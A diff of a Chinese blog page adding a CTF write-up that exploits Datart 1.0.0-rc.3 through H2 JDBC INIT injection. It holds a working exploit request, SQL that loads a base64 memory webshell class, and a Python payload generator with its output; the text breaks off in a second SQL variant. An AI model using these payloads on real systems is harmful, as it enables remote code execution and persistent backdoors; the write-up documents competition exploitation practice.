@@ -272,6 +272,14 @@
     <li><a href="#ecshop">ecshop</a></li>
     <li><a href="#safesecret">safesecret</a></li>
   </ol>
+
+  <ol>
+    <li><a href="#ctf">ctf</a>
+      <ol>
+        <li><a href="#ezdatart">Ezdatart</a></li>
+      </ol>
+    </li>
+  </ol>
 </nav>
         </div>
     </section>
@@ -347,7 +355,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 4 分钟
+                    阅读时长: 6 分钟
                 </time>
             </div>
         
@@ -1175,7 +1183,363 @@
 		data-flex-basis="441px"
 	
 ></p>
-<p>​</p>
+<h1 id="决赛">决赛
+</h1><h2 id="ctf">ctf
+</h2><h3 id="ezdatart">Ezdatart
+</h3><p>查看版本号1.0.0-rc.3，网上找到两个漏洞</p>
+<p><a class="link" href="https://xz.aliyun.com/news/16394"  target="_blank" rel="noopener"
+    >elephant Datart 1.0.0-rc3漏洞分析(CVE-2024-12994)-先知社区</a></p>
+<p><a class="link" href="https://github.com/xyyzxc/CVE-2025-56819/"  target="_blank" rel="noopener"
+    >GitHub - xyyzxc/CVE-2025-56819: An issue in Datart v.1.0.0-rc.3 allows a remote attacker to execute arbitrary code via the INIT connection parameter.</a></p>
+<p>试了第一个的文件上传弹shell,没回显，dnslog也没反应，可能不出网</p>
+<p>尝试第二个,说是h2jdbc的INIT能命令注入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /api/v1/data-provider/test HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 172.31.17.18:8080
+</span></span><span class="line"><span class="cl">Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhNXJ6IiwicGFzc3dvcmQiOjE3MzUwMDcyNTEsImV4cCI6MTc2NDI1NDE4N30.QrUiSEVQ76ayw0mAQOKZsSt2pf67DsX4qw2x3eUCZvE
+</span></span><span class="line"><span class="cl">Content-Type: application/json
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">   &#34;name&#34;: &#34;jdbc-data-provider&#34;,
+</span></span><span class="line"><span class="cl">   &#34;type&#34;: &#34;JDBC&#34;,
+</span></span><span class="line"><span class="cl">   &#34;properties&#34;: {
+</span></span><span class="line"><span class="cl">     &#34;dbType&#34;: &#34;H2&#34;,
+</span></span><span class="line"><span class="cl">     &#34;url&#34;: &#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS &#39;void cmd_exec(String cmd) throws java.lang.Exception {Runtime.getRuntime().exec(cmd)\\;}&#39;\\;CALL EXEC (&#39;touch /tmp/test1&#39;)\\;&#34;,
+</span></span><span class="line"><span class="cl">     &#34;user&#34;: null,
+</span></span><span class="line"><span class="cl">     &#34;password&#34;: &#34;&#34;,
+</span></span><span class="line"><span class="cl">     &#34;driverClass&#34;: &#34;org.h2.Driver&#34;
+</span></span><span class="line"><span class="cl">   }
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>只会200状态没回显</p>
+<p>利用h2的<code>RUNSCRIPT</code>命令，强制执行flag，配合<code>TRACE_LEVEL_SYSTEM_OUT=3</code>泄露出flag</p>
+<p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81wp/image-20251127222034540.png"
+	width="1863"
+	height="677"
+	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81wp/image-20251127222034540_hu909366778277299948.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81wp/image-20251127222034540_hu14072971908930755061.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251127222034540"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="275"
+		data-flex-basis="660px"
+	
+></p>
+<p>内存马：<a class="link" href="https://fushuling.com/index.php/2025/09/11/h2-jdbc%e4%b8%8d%e5%87%ba%e7%bd%91poc%e8%87%aa%e5%8a%a8%e7%94%9f%e6%88%90/"  target="_blank" rel="noopener"
+    >h2 jdbc不出网poc自动生成 – fushulingのblog</a></p>
+<p>先生成内存马</p>
+<p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81wp/image-20251127231259505.png"
+	width="1098"
+	height="768"
+	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81wp/image-20251127231259505_hu12113708381583865672.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81wp/image-20251127231259505_hu3304439586574740921.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251127231259505"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="142"
+		data-flex-basis="343px"
+	
+></p>
+<p>注入的sql文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">CREATE</span><span class="w"> </span><span class="k">ALIAS</span><span class="w"> </span><span class="n">AQWSSSAZ</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="err">$$</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">String</span><span class="w"> </span><span class="n">shellexec</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">abc</span><span class="p">)</span><span class="w"> </span><span class="n">throws</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="k">Exception</span><span class="w"> </span><span class="err">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">byte</span><span class="p">[]</span><span class="w"> </span><span class="n">standBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">null</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">tomcatStr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&#34;yv66vgAAADEBjQEAImNvbS...(填入生成的base64 poc)&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="k">Class</span><span class="w"> </span><span class="n">unsafeClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="k">Class</span><span class="p">.</span><span class="n">forName</span><span class="p">(</span><span class="s2">&#34;sun.misc.Unsafe&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="n">reflect</span><span class="p">.</span><span class="n">Field</span><span class="w"> </span><span class="n">unsafeField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">unsafeClass</span><span class="p">.</span><span class="n">getDeclaredField</span><span class="p">(</span><span class="s2">&#34;theUnsafe&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">unsafeField</span><span class="p">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="k">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">sun</span><span class="p">.</span><span class="n">misc</span><span class="p">.</span><span class="n">Unsafe</span><span class="w"> </span><span class="n">unsafe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">sun</span><span class="p">.</span><span class="n">misc</span><span class="p">.</span><span class="n">Unsafe</span><span class="p">)</span><span class="w"> </span><span class="n">unsafeField</span><span class="p">.</span><span class="k">get</span><span class="p">(</span><span class="k">null</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="n">Module</span><span class="w"> </span><span class="n">module</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="k">Object</span><span class="p">.</span><span class="k">class</span><span class="p">.</span><span class="n">getModule</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="k">Class</span><span class="w"> </span><span class="n">cls</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AQWSSSAZ</span><span class="p">.</span><span class="k">class</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">long</span><span class="w"> </span><span class="k">offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">unsafe</span><span class="p">.</span><span class="n">objectFieldOffset</span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="k">Class</span><span class="p">.</span><span class="k">class</span><span class="p">.</span><span class="n">getDeclaredField</span><span class="p">(</span><span class="s2">&#34;module&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">unsafe</span><span class="p">.</span><span class="n">getAndSetObject</span><span class="p">(</span><span class="n">cls</span><span class="p">,</span><span class="w"> </span><span class="k">offset</span><span class="p">,</span><span class="w"> </span><span class="n">module</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="n">reflect</span><span class="p">.</span><span class="k">Method</span><span class="w"> </span><span class="n">defineClass</span><span class="w"> </span><span class="o">=</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="n">ClassLoader</span><span class="p">.</span><span class="k">class</span><span class="p">.</span><span class="n">getDeclaredMethod</span><span class="p">(</span><span class="s2">&#34;defineClass&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">byte</span><span class="p">[].</span><span class="k">class</span><span class="p">,</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="nb">Integer</span><span class="p">.</span><span class="k">TYPE</span><span class="p">,</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="nb">Integer</span><span class="p">.</span><span class="k">TYPE</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">defineClass</span><span class="p">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="k">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">byte</span><span class="p">[]</span><span class="w"> </span><span class="n">bytecode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="n">Base64</span><span class="p">.</span><span class="n">getDecoder</span><span class="p">().</span><span class="n">decode</span><span class="p">(</span><span class="n">tomcatStr</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="k">Class</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="k">Class</span><span class="p">)</span><span class="w"> </span><span class="n">defineClass</span><span class="p">.</span><span class="n">invoke</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="n">Thread</span><span class="p">.</span><span class="n">currentThread</span><span class="p">().</span><span class="n">getContextClassLoader</span><span class="p">(),</span><span class="w"> </span><span class="n">bytecode</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">bytecode</span><span class="p">.</span><span class="k">length</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">clazz</span><span class="p">.</span><span class="n">newInstance</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="s2">&#34;test&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">$$</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">CALL</span><span class="w"> </span><span class="n">AQWSSSAZ</span><span class="p">(</span><span class="s1">&#39;123&#39;</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后python生成payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;用法: python </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2"> &lt;本地sql文件路径&gt; &lt;远程环境写入sql文件路径&gt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;如: python </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s1"> &#34;./poc.sql&#34; &#34;/tmp/aaa&#34;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">a</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">b</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">base64_data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">encoded</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">base64_data</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">step1</span> <span class="o">=</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;INIT=CREATE ALIAS IF NOT EXISTS BASE64_TO_File AS &#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#39;void base64ToFile(String base64Data, String filePath) throws java.io.IOException &#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;{byte[] jarBytes = java.util.Base64.getDecoder().decode(base64Data)</span><span class="se">\\\\</span><span class="s2">;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;try (java.io.FileOutputStream fos = new java.io.FileOutputStream(filePath)) &#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;{fos.write(jarBytes)</span><span class="se">\\\\</span><span class="s2">;}}&#39;</span><span class="se">\\\\</span><span class="s2">;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="sa">f</span><span class="s2">&#34;CALL BASE64_TO_File(&#39;</span><span class="si">{</span><span class="n">encoded</span><span class="si">}</span><span class="s2">&#39;, &#39;</span><span class="si">{</span><span class="n">b</span><span class="si">}</span><span class="s2">&#39;)</span><span class="se">\\\\</span><span class="s2">;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">step2</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;</span><span class="si">{</span><span class="n">b</span><span class="si">}</span><span class="s2">&#39;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;-&#34;</span> <span class="o">*</span> <span class="mi">100</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;step1 poc如下:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">step1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;-&#34;</span> <span class="o">*</span> <span class="mi">100</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;step2 poc如下:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">step2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后运行得到</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>py3.10<span class="o">)</span> D:<span class="se">\v</span>scodetest<span class="se">\p</span>ython&gt;python h2jdbcmemshell.py <span class="s2">&#34;./poc.sql&#34;</span> <span class="s2">&#34;/tmp/aaa&#34;</span>
+</span></span><span class="line"><span class="cl">----------------------------------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">step1 poc如下:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">jdbc:h2:mem:testdb<span class="p">;</span><span class="nv">TRACE_LEVEL_SYSTEM_OUT</span><span class="o">=</span>3<span class="p">;</span><span class="nv">INIT</span><span class="o">=</span>CREATE ALIAS IF NOT EXISTS BASE64_TO_File AS <span class="s1">&#39;void base64ToFile(String base64Data, String filePath) throws java.io.IOException {byte[] jarBytes = java.util.Base64.getDecoder().decode(base64Data)\\;try (java.io.FileOutputStream fos = new java.io.FileOutputStream(filePath)) {fos.write(jarBytes)\\;}}&#39;</span><span class="se">\\</span><span class="p">;</span>CALL BASE64_TO_File<span class="o">(</span><span class="s1">&#39;Q1JFQVRFIEFMSUFTIEFRV1N...(生成的base64)&#39;</span>, <span class="s1">&#39;/tmp/aaa&#39;</span><span class="o">)</span><span class="se">\\</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">----------------------------------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">step2 poc如下:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">jdbc:h2:mem:testdb<span class="p">;</span><span class="nv">TRACE_LEVEL_SYSTEM_OUT</span><span class="o">=</span>3<span class="p">;</span><span class="nv">INIT</span><span class="o">=</span>RUNSCRIPT FROM <span class="s1">&#39;/tmp/aaa&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>先打poc1往tmp下写文件</p>
+<p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81wp/image-20251127233031199.png"
+	width="1846"
+	height="668"
+	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81wp/image-20251127233031199_hu15541605696978088214.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81wp/image-20251127233031199_hu15548628672347589119.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251127233031199"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="276"
+		data-flex-basis="663px"
+	
+></p>
+<p>成功写入</p>
+<p>打poc2执行</p>
+<p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81wp/image-20251127233104009.png"
+	width="1847"
+	height="668"
+	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81wp/image-20251127233104009_hu4003013117176652052.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81wp/image-20251127233104009_hu6974420596485880205.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251127233104009"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="276"
+		data-flex-basis="663px"
+	
+></p>
+<p>报错原因是目标环境jdk小于9,<code>Java.lang.Module</code>类找不到</p>
+<p>那就前面生成内存马不bypass Module，然后sql文件也去掉unsafe的bypass</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">CREATE</span><span class="w"> </span><span class="k">ALIAS</span><span class="w"> </span><span class="n">AQWSSSAB</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="err">$$</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">String</span><span class="w"> </span><span class="n">shellexec</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">abc</span><span class="p">)</span><span class="w"> </span><span class="n">throws</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="k">Exception</span><span class="w"> </span><span class="err">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">byte</span><span class="p">[]</span><span class="w"> </span><span class="n">standBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">null</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">tomcatStr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&#34;yv66vgAAADEBewEALG9yZy9hcGFjaGUvY29tb...(base64)&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="k">Class</span><span class="w"> </span><span class="n">unsafeClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="k">Class</span><span class="p">.</span><span class="n">forName</span><span class="p">(</span><span class="s2">&#34;sun.misc.Unsafe&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="n">reflect</span><span class="p">.</span><span class="n">Field</span><span class="w"> </span><span class="n">unsafeField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">unsafeClass</span><span class="p">.</span><span class="n">getDeclaredField</span><span class="p">(</span><span class="s2">&#34;theUnsafe&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">unsafeField</span><span class="p">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="k">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">sun</span><span class="p">.</span><span class="n">misc</span><span class="p">.</span><span class="n">Unsafe</span><span class="w"> </span><span class="n">unsafe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">sun</span><span class="p">.</span><span class="n">misc</span><span class="p">.</span><span class="n">Unsafe</span><span class="p">)</span><span class="w"> </span><span class="n">unsafeField</span><span class="p">.</span><span class="k">get</span><span class="p">(</span><span class="k">null</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
